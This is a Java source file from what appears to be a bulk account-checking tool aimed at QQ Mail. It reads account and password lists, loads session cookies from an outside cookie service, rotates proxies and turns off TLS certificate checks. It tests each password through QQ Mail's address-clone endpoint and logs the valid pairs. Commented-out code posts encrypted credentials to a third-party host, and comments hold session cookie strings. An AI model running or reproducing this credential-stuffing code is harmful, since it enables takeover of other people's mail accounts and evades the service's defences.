package ws.hoyland.sm;

//import java.io.ByteArrayOutputStream;
import java.math.BigInteger;
//import java.net.URLEncoder;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.cert.CertificateException;
import java.security.spec.RSAPublicKeySpec;
import java.util.Date;

import javax.crypto.Cipher;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

//import javax.crypto.Cipher;

//import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.CookieStore;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.params.ClientPNames;
import org.apache.http.client.params.CookiePolicy;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.conn.ClientConnectionManager;
import org.apache.http.conn.params.ConnRouteParams;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.conn.ssl.SSLSocketFactory;
//import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
//import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import com.ibm.icu.util.Calendar;

//import ws.hoyland.security.ClientDetecter;
import ws.hoyland.util.Configuration;
import ws.hoyland.util.Converts;
//import ws.hoyland.util.Crypter;
//import ws.hoyland.util.EngineMessage;
//import ws.hoyland.util.EngineMessageType;
//import ws.hoyland.util.HoylandClassLoader;
//import ws.hoyland.util.Util;

public class Task implements Runnable {//, Observer {
//	private int id = 0;
//	private String account = null;
//	private String password = null;
	private String line;

//	private ByteArrayOutputStream baos = null;

//	protected boolean run = false;
//	private boolean wflag = false;

	// private static Random RND = new Random();
	// private static String UAG =
	// "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 734; Maxthon; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)";
	// "Opera/9.25 (Windows NT 6.0; U; en)";
	private static String UAG = "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; sdk Build/GRI34) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
//	private static Random RND = new Random();
//	private static String expBytes = "010001";
//	private static String modBytes = "C39A51FB1202F75F0E20F691C8E370BCFA7CD2B75FD588CADAC549ADF1F03CFDAACCB9FBA5D7219CA4A3E40F9324121474BE85355CF178E0D3BD0719EDF859D60D24874B105FAC73EF067DEE962F5D12C7DB983039BA5EE0183479923174886A2C45ACFD5441C1B2FCC2083952016C66631884527585FF446BBC4F75606EF87B";
	
	private static String expBytes = "10001";
	private static String modBytes = "CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9";

	
	private static Configuration CONFIGURATION = Configuration
			.getInstance("config.ini");
	
	private static TrustManager tm = new X509TrustManager() {

		public void checkClientTrusted(
				java.security.cert.X509Certificate[] arg0, String arg1)
				throws CertificateException {

		}

		public void checkServerTrusted(
				java.security.cert.X509Certificate[] arg0, String arg1)
				throws CertificateException {

		}

		public java.security.cert.X509Certificate[] getAcceptedIssuers() {
			return null;
		}
	};
	
//	private static String VERSION = "10074";
	
//	static{
//		HttpURLConnection connection = null;
//		InputStream input = null;
//		try{
//			URL url = new URL("http://ui.ptlogin2.qq.com/ptui_ver.js?v="+Math.random());
//			connection = (HttpURLConnection) url
//					.openConnection();
//			connection.setDoOutput(true);
//			connection.setRequestMethod("GET");
//			
//			input = connection.getInputStream();
//			byte[] bs = new byte[input.available()];
//			input.read(bs);
//			String resp = new String(bs);
//			VERSION = resp.substring(resp.indexOf("ptuiV(\"")+7, resp.indexOf("\");"));
//			System.err.println("version:"+VERSION);
//		}catch(Exception e){
//			e.printStackTrace();
//		}finally{
//			if(input!=null){
//				try{
//					input.close();
//				}catch(Exception e){
//					e.printStackTrace();
//				}
//			}
//			if(connection!=null){
//				try{
//					connection.disconnect();
//				}catch(Exception e){
//					e.printStackTrace();
//				}
//			}
//		}		
//	}

	public Task(String line) {
		this.line = line;

//		this.run = true;
	}
	/**
	@Override
	public void update(Observable obj, Object arg) {

		final EngineMessage msg = (EngineMessage) arg;

		if (msg.getTid() == this.id || msg.getTid() == -1) { // -1, all tasks
																// message
			int type = msg.getType();
			switch (type) {
			case EngineMessageType.OM_SHUTDOWN:
				// System.out.println(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>2");
//				this.run = false;
//				if (request != null) {
//					request.abort();
//					request.releaseConnection();
//				}
				break;
			case EngineMessageType.OM_RELOAD_PROXIES:
//				wflag = !wflag;
			default:
				break;
			}
		}
	}
	 **/
	
	@Override
	public void run() {
		if (!Engine.getInstance().canRun()) {
			// if(!run){
			return;
		}

		int id = 0;
		String account = null;
		String password = null;
		
		String[] ls = line.split("----");
		try{
			id = Integer.parseInt(ls[0]);
			account = ls[1];
			password = ls[2];
		}catch(Exception e){
			System.err.println(line);
			e.printStackTrace();			
		}
		
		DefaultHttpClient client = null;
		HttpGet request = null;
//		private HttpPost post = null;
		HttpHost proxy = null;
		HttpResponse response = null;
		HttpEntity entity = null;
		String resp = null;
		
		// if(wflag){
		// synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
		// try{
		// SyncUtil.RELOAD_PROXY_OBJECT.wait();//等待更新完代理
		// }catch(Exception e){
		// //
		// }
		// }
		// }
		//
		// synchronized(SyncUtil.START_OBJECT){
		// //通知有新线程开始执行
//		Engine.getInstance().beginTask();
		// }

		try {
			client = new DefaultHttpClient();
			client.getParams().setParameter(
					CoreConnectionPNames.CONNECTION_TIMEOUT,
					1000 * Integer.parseInt(CONFIGURATION
							.getProperty("TIMEOUT")));
			client.getParams().setParameter(
					CoreConnectionPNames.SO_TIMEOUT,
					1000 * Integer.parseInt(CONFIGURATION
							.getProperty("TIMEOUT")));
			client.getParams().setParameter(ClientPNames.HANDLE_REDIRECTS, false);  
			
			HttpClientParams.setCookiePolicy(client.getParams(), CookiePolicy.BROWSER_COMPATIBILITY);
			
			try {
				SSLContext sslcontext = SSLContext.getInstance("SSL");
				sslcontext.init(null, new TrustManager[]{tm}, null);
		        SSLSocketFactory ssf = new    SSLSocketFactory(sslcontext, SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
		        ClientConnectionManager ccm = client.getConnectionManager();
		        SchemeRegistry sr = ccm.getSchemeRegistry();
		        sr.register(new Scheme("https", 443, ssf));
			} catch (Exception e) {
				e.printStackTrace();
			}
			//client.getConnectionManager().closeIdleConnections(4000, TimeUnit.MILLISECONDS);
			
			//获取cookie
//			byte[] bs = null;
//			HttpURLConnection connection = null;
//			InputStream input = null;
			boolean getit = false;
			
			String cl = null;//cookie line			
			
			String cookieapi = CONFIGURATION.getProperty("COOKIE_API");			
			int hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
			request = new HttpGet(cookieapi.replace("/cs/", "/cs"+(hour/3+1)+"/"));
			request.setHeader("Connection", "close");
			
			response = client.execute(request);
			entity = response.getEntity();
			resp = EntityUtils.toString(entity);
			
			try {
				if (entity != null) {
					EntityUtils.consume(entity);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			if (request != null) {
				request.releaseConnection();
				request.abort();
			}
			
			cl = resp.substring(0, resp.indexOf("\n"));
			if("null".equals(cl)){
				getit = false;
			}else{
				getit = true;
			}
			
			client.getCookieStore().clear();
			/**
			try {
				URL url = new URL(CONFIGURATION.getProperty("COOKIE_API"));
				
				connection = (HttpURLConnection) url
						.openConnection();
				connection.setDoOutput(true);// 允许连接提交信息
				connection.setRequestMethod("GET");// 网页提交方式“GET”、“POST”
				// connection.setRequestProperty("User-Agent",
				// "Mozilla/4.7 [en] (Win98; I)");
				connection.setRequestProperty("Content-Type",
						"text/plain; charset=UTF-8");
				connection.setRequestProperty("Connection",
						"close");
//				StringBuffer sb = new StringBuffer();
//				sb.append(header);
//				sb.append(Converts.bytesToHexString(encrypted));
//				os = connection.getOutputStream();
//				os.write(sb.toString().getBytes());
//				os.flush();
//				os.close();

				input = connection.getInputStream();
				bs = new byte[input.available()];
				input.read(bs);
				
				
				cl = new String(bs);
				cl = cl.substring(0, cl.indexOf("\n"));
				if("null".equals(cl)){
					getit = false;
				}else{
					getit = true;
				}
			} catch (Exception e) {
				e.printStackTrace();
				getit = false;
			}finally{
				input.close();
			}
			**/
			//cl = "tinfo=1397895904.0000*; wimrefreshrun=0&; qm_antisky=1627389787&7ee3dcfb9ac087e01a10b9c6a2bd8a72824757e54a0674f8a81758f39acd395f; autologin=; qm_flag=0; qqmail_alias=1627389787@qq.com; qm_domain=; qm_verifyimagesession=; qm_authimgs_id=; qm_sk=; pcache=; device=; qm_ssum=; qm_qz_key=; sid=1627389787&c71f6000f0d174c4c1ea9c88d614896b,qenhrMUIyeXY2OUE2N04tbUJmTkV5OW5VMmFhT3dCS2J1bms5MFVCcGdZRV8.; qm_username=1627389787; qm_lg=qm_lg; new_mail_num=1627389787&0; qm_username=; qm_sid=c71f6000f0d174c4c1ea9c88d614896b,qenhrMUIyeXY2OUE2N04tbUJmTkV5OW5VMmFhT3dCS2J1bms5MFVCcGdZRV8.; qm_domain=http://mail.qq.com; qm_ptsk=1627389787&@thfOVARet; CCSHOW=0000; foxacc=1627389787&0; ssl_edition=mail.qq.com; edition=mail.qq.com; username=1627389787&1627389787;";
			/**
			byte[] bs = null;
//			HttpURLConnection connection = null;
//			OutputStream os = null;
//			InputStream input = null;
			DataInputStream in = null;
			boolean getit = false;
			try {
				//URL url = new URL("http://www.y3y4qq.com/gc");

				Crypter crypt = new Crypter();
				byte[] mid = Converts.hexStringToByte(ClientDetecter
						.getMachineID("SMZS"));

				// String url = "http://www.y3y4qq.com/ge";
				byte[] key = Util.genKey();
				String header = Converts.bytesToHexString(key).toUpperCase()
						+ Converts.bytesToHexString(crypt.encrypt(mid, key))
								.toUpperCase();
				// Console.WriteLine(byteArrayToHexString(key).ToUpper());
				// Console.WriteLine(content);
				// client.UploadString(url, content);
				// client.UploadString(url,
				// client.Encoding = Encoding.UTF8;

				String content = "account=" + account + "&password=" + password;
				// RSA加密
				KeyFactory factory = KeyFactory.getInstance("RSA");
				Cipher cipher = Cipher.getInstance("RSA");
				BigInteger modules = new BigInteger(modBytes, 16);
				BigInteger exponent = new BigInteger(expBytes, 16);

				RSAPublicKeySpec pubSpec = new RSAPublicKeySpec(modules,
						exponent);
				PublicKey pubKey = factory.generatePublic(pubSpec);
				cipher.init(Cipher.ENCRYPT_MODE, pubKey);
				byte[] encrypted = cipher.doFinal(content.getBytes());

				post = new HttpPost("http://www.y3y4qq.com/gc");
				
				post.setHeader("User-Agent", UAG);
				post.setHeader("Content-Type",
						"application/x-www-form-urlencoded");
				post.setHeader("Connection",
						"close");

				StringBuffer sb = new StringBuffer();
				sb.append(header);
				sb.append(Converts.bytesToHexString(encrypted));
				
				post.setEntity(new StringEntity(sb.toString()));

				response = client.execute(post);
				entity = response.getEntity();
				
				
				in = new DataInputStream(entity.getContent());
				baos = new ByteArrayOutputStream();
				byte[] barray = new byte[32];
				int size = -1;
				while ((size = in.read(barray)) != -1) {
					baos.write(barray, 0, size);
				}
				bs = baos.toByteArray();
//				ByteArrayInputStream bais = new ByteArrayInputStream(
//						baos.toByteArray());

				
//				connection = (HttpURLConnection) url
//						.openConnection();
//				connection.setDoOutput(true);// 允许连接提交信息
//				connection.setRequestMethod("POST");// 网页提交方式“GET”、“POST”
//				// connection.setRequestProperty("User-Agent",
//				// "Mozilla/4.7 [en] (Win98; I)");
//				connection.setRequestProperty("Content-Type",
//						"text/plain; charset=UTF-8");
//				connection.setRequestProperty("Connection",
//						"close");
//				StringBuffer sb = new StringBuffer();
//				sb.append(header);
//				sb.append(Converts.bytesToHexString(encrypted));
//				os = connection.getOutputStream();
//				os.write(sb.toString().getBytes());
//				os.flush();
				//os.close();

//				input = connection.getInputStream();
//				bs = new byte[input.available()];
//				input.read(bs);
				getit = true;
			} catch (Exception e) {
				e.printStackTrace();
				getit = false;
			}finally{
				if(in!=null){
					in.close();
				}
				if(baos!=null){
					baos.close();
				}
				try {
					if (entity != null) {
						EntityUtils.consume(entity);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				if(post!=null){
					post.releaseConnection();
					post.abort();
				}				
			}
			**/
			String sid = null;
			if(getit){
				Engine.getInstance().info(account + " -> " + "Got Cookie");
				
				String px = Engine.getInstance().getProxy();
				// if(px==null){
				// throw new NoProxyException("No Proxy!");
				// }
				if (!Engine.getInstance().canRun()) {
					return;
				}
				
				if(px!=null){
					String[] ms = px.split(":");
					proxy = new HttpHost(ms[0], Integer.parseInt(ms[1]));
					
					client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY,
							proxy);
				}
				
				request = new HttpGet("https://mail.qq.com/cgi-bin/login?vt=passport&vm=wsk&delegate_url=");

				request.setHeader("User-Agent", UAG);
				request.setHeader("Content-Type", "text/html");
				request.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
				request.setHeader("Accept-Encoding", "gzip, deflate");
				request.setHeader("Referer", "https://mail.qq.com/cgi-bin/loginpage");
				request.setHeader("Connection", "close");

				CookieStore  cs = client.getCookieStore();
				//
				//String[] cks = "pt2gguin=o1696195841; uin=o1696195841; skey=@AIhN7K0s4; ETK=; superuin=o1696195841; superkey=2O4VH82tu3wNKKLh3zs*YTERLw159XoZz9nFgLz9rLw_; supertoken=1512671834; ptisp=ctc; RK=TeXO02CBe3; ptuserinfo=e4b880e4ba8ce4b889; ptcz=8b10fd2ce893905d7dedff0af7452fc0040c9de336dede894c396a3c98c7e678; ptcz=; airkey=; ptwebqq=6a8cce7c33974d34778f4a199b4db563dbc894f0d40807f36154c6091934ee14;".split(" ");
				
				//设置cookie				
				String[] cks = cl.split(" ");
				for(int i=0;i<cks.length;i++){
					try{
						String[] lsx = cks[i].substring(0, cks[i].length()-1).split("=");
						//System.out.println(cks[i]+"/"+ls.length);
						BasicClientCookie cookie = null;
						if(lsx.length==1){
							cookie = new BasicClientCookie(lsx[0], "");
						}else{
//							System.err.println(lsx[0]+"="+lsx[1]);
	//						System.err.println(lsx[1]);
							cookie = new BasicClientCookie(lsx[0], lsx[1]);
						}
						cookie.setDomain("mail.qq.com");
						cookie.setPath("/");
						
						cs.addCookie(cookie);
					}catch(Exception e){
//						System.out.println(cks[i]);
//						System.out.println(cks[i].length());
						e.printStackTrace();
					}
				}
				client.setCookieStore(cs);
				
				response = client.execute(request);
				entity = response.getEntity();

				resp = EntityUtils.toString(entity);
				
				try {
					if (entity != null) {
						EntityUtils.consume(entity);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				if (request != null) {
					request.releaseConnection();
					request.abort();
				}

				if(resp.indexOf("frame_html?sid=")==-1){
					Engine.getInstance().info(account + " -> " + "Cookie 超时");
					Engine.getInstance().addTask(line);
					return;
				}
				
				//frame_html?sid=
				//",clienti
				sid = resp.substring(resp.indexOf("frame_html?sid=")+15, resp.indexOf("frame_html?sid=")+31);
				//System.err.println("sid="+sid);

				String r = resp.substring(resp.indexOf("targetUrl+=\"&r=")+15, resp.indexOf("targetUrl+=\"&r=")+47);
				//System.err.println("r="+r);
				/**
				
				String px = Engine.getInstance().getProxy();
				// if(px==null){
				// throw new NoProxyException("No Proxy!");
				// }
				if (!Engine.getInstance().canRun()) {
					return;
				}
				
				String[] ms = px.split(":");
				proxy = new HttpHost(ms[0], Integer.parseInt(ms[1]));

				
				client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY,
						proxy);
				**/
				Engine.getInstance().info(account + " -> " + "sid="+sid);
				HttpPost post = new HttpPost("http://mail.qq.com/cgi-bin/laddr_clone?sid="+sid);

				post.setHeader("User-Agent", UAG);
				post.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
				post.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
				post.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
				post.setHeader("Accept-Encoding", "gzip, deflate");
				post.setHeader("Referer", "http://mail.qq.com/cgi-bin/frame_html?sid="+sid+"&r="+r);
				post.setHeader("Connection", "close");				
				post.setHeader("Pragma", "no-cache");
				post.setHeader("Cache-Control", "no-cache");
				
				
				KeyFactory factory = KeyFactory.getInstance("RSA");
				Cipher cipher = Cipher.getInstance("RSA");
				BigInteger modules = new BigInteger(modBytes, 16);
				BigInteger exponent = new BigInteger(expBytes, 16);

				RSAPublicKeySpec pubSpec = new RSAPublicKeySpec(modules,
						exponent);
				PublicKey pubKey = factory.generatePublic(pubSpec);
				cipher.init(Cipher.ENCRYPT_MODE, pubKey);
				byte[] encrypted = cipher.doFinal((password+ "\n" + (System.currentTimeMillis() / 1000) + "\n").getBytes());
//				byte[] encrypted = cipher.doFinal(("1234"+ "\n" + "1397805395" + "\n").getBytes());
//				System.err.println(password);
//				System.err.println(System.currentTimeMillis() / 1000);
//				System.err.println(Converts.bytesToHexString(encrypted).toLowerCase());
				//encrypted = Converts.hexStringToByte("1e395b2f6e5eb556c0d08c64f73be3ad7a08826fd2d0d55d839196ae142d0cb6b610d4fc4b5769d283a868f5f78a1068ee2946a753bc5462d6d41342dea265121c6d2e7d2f19bc9b688d2301a185da7855e19271a9d903da4deb275d4ed3e5f48c626b18eab7eb19d6ae7b3377663a2896b7c901fb41022dbc011d5076f8af1c");
				
				
				//Base64 base64 = new Base64();
				//String epwd = (new String(base64.encode(encrypted)));
				String epwd = Converts.hexStringToB64(Converts.bytesToHexString(encrypted).toLowerCase());
				//System.err.println("old="+Converts.bytesToHexString(encrypted).toLowerCase());
				//System.err.println("epwd="+epwd);
				//YxGWKkCgFRSbFir0dEc55Uu2JyjnrobI4%2BtzJcMMQNTMcbDP5knm2IPo2VX84rKs%2BhC%2BYdhZi/HCJwkh53n2oufwve0V610p19x2RFmTpmzRW8G3ryAvcS5gOvLBm5yRdANFG8HINWVOjtemjLqGf0mnGOp1U8OTOPktTKlCnBs
				StringEntity se = new StringEntity("sid="+sid+"&grpname="+account+"@qq.com&fun=clone&Email="+account+"@qq.com&Pwd="+epwd.replaceAll("\\+", "%2B")+"&t=addr_clone.json&ef=js&version=2");
				post.setEntity(se);
				
//				Engine.getInstance().info(
//						account + " -> " + proxy.getHostName() + ":"
//								+ proxy.getPort());
				
				response = client.execute(post);
				entity = response.getEntity();
				resp = EntityUtils.toString(entity);
				
				if(resp.startsWith("(")){
					resp = resp.substring(1, resp.length()-1);
				}
				if(resp.indexOf("errcode : 0")!=-1){//正确
					Engine.getInstance().log(0, id, account + "----" + password);
				}else{
					JSONObject json = null;
					try{
						json = new JSONObject(resp);
					}catch(Exception e){
						System.err.println(resp);
						e.printStackTrace();
						Engine.getInstance().addTask(line);
					}
					if(json!=null){
						if("-102".equals(json.getString("errcode"))){//错误
							Engine.getInstance().log(1, id,  account + "----" + password);
						}else if("-109".equals(json.getString("errcode"))){ //服务器太忙
							Engine.getInstance().info(account + " -> " + "服务器繁忙");
							Engine.getInstance().addTask(line);
						}else if("-125".equals(json.getString("errcode"))){ //不存在的邮箱地址
							Engine.getInstance().info(account + " -> " + "不存在的邮箱地址");
						}else if("-113".equals(json.getString("errcode"))){ //独立密码
							//Engine.getInstance().log(3, id,  account + "----" + password);
							Engine.getInstance().log(0, id,  account + "----" + password);
						}else if("-1".equals(json.getString("errcode"))){ //独立密码
							//Engine.getInstance().log(3, id,  account + "----" + password);
							System.out.println(resp + " @ " + account + "----" + password);
							Engine.getInstance().addTask(line);
						}else{
							//System.out.println("未知错误:"+resp);
							Engine.getInstance().info(account + " -> " + "未知错误:"+resp);
							Engine.getInstance().addTask(line);
						}
					}
				}
				
				try {
					if (entity != null) {
						EntityUtils.consume(entity);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				if (post != null) {
					post.releaseConnection();
					post.abort();
				}
				
				///////////////////////////
				
//				boolean nvc = false;
//				//nvc = (resp.charAt(14)=='1')?true:false;
//				//System.out.println("A:"+resp);
//				if(!resp.startsWith("ptui_checkVC")){
//					throw new Exception("Invalid Proxy server");
//				}
//
//				nvc = (resp.charAt(14)=='1')?true:false;
//				
//				//没有做RSAKEY检查，默认是应该有KEY，用getEncryption；否则用getRSAEncryption
//				//System.out.println("B:"+resp);
//				if(nvc){//验证码
//					System.out.println(">>>>>>>>>>>>>>>>");
//					return;
//				}
//				System.out.println("nvc:"+resp.charAt(14));
//				System.out.println("============");
//				//System.out.println(resp);
//				int fidx = resp.indexOf(",");
//				int lidx = resp.lastIndexOf(",");
//				
//				String vcode = resp.substring(fidx+2, lidx-1);
//				System.err.println("vcode="+vcode);
//				String salt = resp.substring(lidx+2, lidx+34);
//				System.err.println("salt="+salt);
//				
//
//				//计算ECP
//				MessageDigest md = MessageDigest.getInstance("MD5"); 
//				byte[] results = md.digest(password.getBytes());
//				
//				int psz = results.length;
//				byte[] rs = new byte[psz+8];
//				for(int i=0;i<psz;i++){
//					rs[i] = results[i];
//				}
//				
//				String[] salts = salt.substring(2).split("\\\\x");
//				//System.out.println(salts.length);
//				for(int i=0; i<salts.length; i++){
//					rs[psz+i] = (byte)Integer.parseInt(salts[i], 16);
//				}
//				
//				results = md.digest(rs); 
//				String resultString = Util.byteArrayToHexString(results).toUpperCase();
//				
//				//vcode = "!RQM";
//				results = md.digest((resultString+vcode.toUpperCase()).getBytes()); 				
//				resultString = Util.byteArrayToHexString(results).toUpperCase();
//				//System.out.println(resultString);
//				String ecp = resultString;
//				
//				
//				//System.out.println("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");
//				request = new HttpGet("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");
//
////				request.setHeader("User-Agent", UAG);
////				//request.setHeader("Content-Type", "text/html");
////				request.setHeader("Accept", "*/*");
////				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
////				request.setHeader("Accept-Encoding", "gzip, deflate");
////				request.setHeader("Referer", "http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");
////				request.setHeader("Connection", "keep-alive");				
//				request.setHeader("Cookie", "ptui_loginuin="+account);
//				
//				// try{
//				// Thread.sleep(200);
//				// }catch(Exception e){
//				// return;
//				// }
//	
//				// if(!run){
////				if (!Engine.getInstance().canRun()) {
////					return;
////				}
//				
//				response = client.execute(request);
//				entity = response.getEntity();
//				resp = EntityUtils.toString(entity);
//	
//				//if(resp.startsWith("ptuiCB('4'")){ //验证码错误
//				if(resp.startsWith("ptuiCB('0'")){ //成功登录
//					Engine.getInstance().log(0, id, account + "----" + password);
//				}else if(resp.startsWith("ptuiCB('3'")){ //您输入的帐号或密码不正确，请重新输入
//					Engine.getInstance().log(1, id,  account + "----" + password);
//				}else if(resp.startsWith("ptuiCB('19'")){ //帐号冻结，提示暂时无法登录
//					Engine.getInstance().log(2, id,  account + "----" + password);
//				}else{
//					// ptuiCB('19' 暂停使用
//					// ptuiCB('7' 网络连接异常
//					Engine.getInstance().addTask(line);
//				}
//				
				/**
				 * Class<?> clazz = null; clazz = new
				 * HoylandClassLoader().loadClass("ws.hoyland.sm.Dynamicer",
				 * account, password); resp = (String)(clazz.getMethod("excute", new
				 * Class[] { DefaultHttpClient.class}).invoke(null, new
				 * Object[]{client}));
				 **/
	
//				if (resp.indexOf("pt.handleLoginResult") == -1)// 代理异常
//				{
//					Engine.getInstance().addTask(line);
//					// System.out.println("A2");
//					// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
//				} else {
//					// System.out.println("A3");
//					// bool ok = false;
//					if (resp.indexOf("," + account + ",0,") != -1) {
//						Engine.getInstance().log(0, id, account + "----" + password);// account
//																					// +
//																					// " / "
//																					// +
//																					// proxy
//						// task.Abort();
//					} else if (resp.indexOf(",0,40010,") != -1) {
//						Engine.getInstance().log(1, id,  account + "----" + password);
//						// task.Abort();
//					} else if (resp.indexOf(",0,40026,") != -1) {
//						Engine.getInstance().log(2, id, account + "----" + password);
//						// task.Abort();
//					} else if (resp.indexOf("," + account + ",40001,") != -1)// 验证码
//					{
//						//System.err.println("adding "+line);
//						Engine.getInstance().addTask(line);
//	
//						// 不离开当前任务
//						// Thread.Sleep(1000 *
//						// Int32.Parse(cfa.AppSettings.Settings["P_ITV"].Value));//N秒后继续
//					} else // 代理异常
//					{
//						Engine.getInstance().addTask(line);
//						// System.out.println("A4");
//						// System.out.println("proxy="+proxy);
//						// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
//					}
//				}
			}else{
				//DO Nothing
				Engine.getInstance().info(account + " -> " + "Can't get any Cookie");
				Engine.getInstance().addTask(line);
			}
		}
		// catch(NoProxyException e){
		// //
		// }
		catch (Exception e) {
			e.printStackTrace();
			Engine.getInstance().info(account + " -> " + e.getMessage());
			Engine.getInstance().addTask(line);
			//System.err.println(e.getMessage());
			// try{

			// if(proxy!=null){
			// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
			// }

			// }catch(Exception ex){
			// e.printStackTrace();
			// System.err.println("////////////");
			// ex.printStackTrace();
			// }
		} finally {
			try {
				if (entity != null) {
					EntityUtils.consume(entity);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			if (request != null) {
				request.releaseConnection();
				request.abort();
			}

			if(client!=null){
				client.getConnectionManager().shutdown();
			}
		}

//		String[] dt = new String[2];
//		dt[0] = "0";

		//Engine.getInstance().deleteObserver(this);

		// synchronized(SyncUtil.FINISH_OBJECT){
//		Engine.getInstance().endTask();
		// }
	}
}
